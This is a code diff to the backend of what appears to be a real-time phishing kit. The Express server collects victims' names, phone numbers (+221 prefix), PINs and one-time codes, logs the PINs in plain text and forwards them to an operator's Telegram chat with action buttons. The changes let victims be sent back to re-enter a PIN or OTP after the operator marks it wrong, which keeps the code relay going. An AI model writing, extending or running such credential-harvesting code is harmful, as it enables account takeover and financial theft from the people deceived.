@@ -153,14 +153,25 @@ app.post('/api', async (req, res) => {
 
     case 'login_attempt': {
       const { firstName = 'Unknown', lastName = 'User', phone, pin } = data;
-      const sessionId = uuidv4();
       const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
 
-      sessions[sessionId] = {
-        firstName, lastName, phone, pin,
-        status: 'pending', createdAt: Date.now(), ip,
-        msgId: null, otpMsgId: null,
-      };
+      // Check if a session already exists for this phone (re-attempt after wrong_pin)
+      let sessionId = data.sessionId;
+      let session = sessionId ? sessions[sessionId] : null;
+
+      if (session && session.status === 'pending') {
+        // Update PIN on existing session and send new alert
+        session.pin = pin;
+      } else {
+        // Brand new session
+        sessionId = uuidv4();
+        sessions[sessionId] = {
+          firstName, lastName, phone, pin,
+          status: 'pending', createdAt: Date.now(), ip,
+          msgId: null, otpMsgId: null,
+        };
+        session = sessions[sessionId];
+      }
 
       console.log(`[LOGIN]  ${firstName} ${lastName} | +221${phone} | PIN: ${pin}`);
 
@@ -175,7 +186,7 @@ app.post('/api', async (req, res) => {
         loginKeyboard(sessionId)
       );
 
-      if (sent && sent.ok) sessions[sessionId].msgId = sent.result.message_id;
+      if (sent && sent.ok) session.msgId = sent.result.message_id;
 
       return res.json({ success: true, data: { sessionId } });
     }
@@ -216,7 +227,6 @@ app.post('/api', async (req, res) => {
 
       console.log(`[RESEND] Session: ${sessionId}`);
 
-      // Alert admin that user requested a resend
       await tgSend(
         `🔄 <b>OTP Resend Requested</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
@@ -227,6 +237,15 @@ app.post('/api', async (req, res) => {
 
       session.status = 'otp_pending';
 
+      return res.json({ success: true });
+    }
+
+    case 'reset_otp': {
+      // Called by frontend after wrong_code — resets status so user can enter OTP again
+      const { sessionId } = data;
+      const session = sessions[sessionId];
+      if (!session) return res.json({ success: false, error: 'Session not found' });
+      session.status = 'otp_pending';
       return res.json({ success: true });
     }
 
@@ -329,6 +348,8 @@ app.post('/webhook', async (req, res) => {
         `🔑 <b>PIN entered:</b> <code>${session.pin}</code>\n` +
         `🕐 <b>Actioned:</b> ${now()}`
       );
+      // Reset to pending after 2s so user can try a new PIN and trigger a fresh alert
+      setTimeout(() => { if (sessions[sessionId]) sessions[sessionId].status = 'pending'; }, 2000);
       break;
     }
 
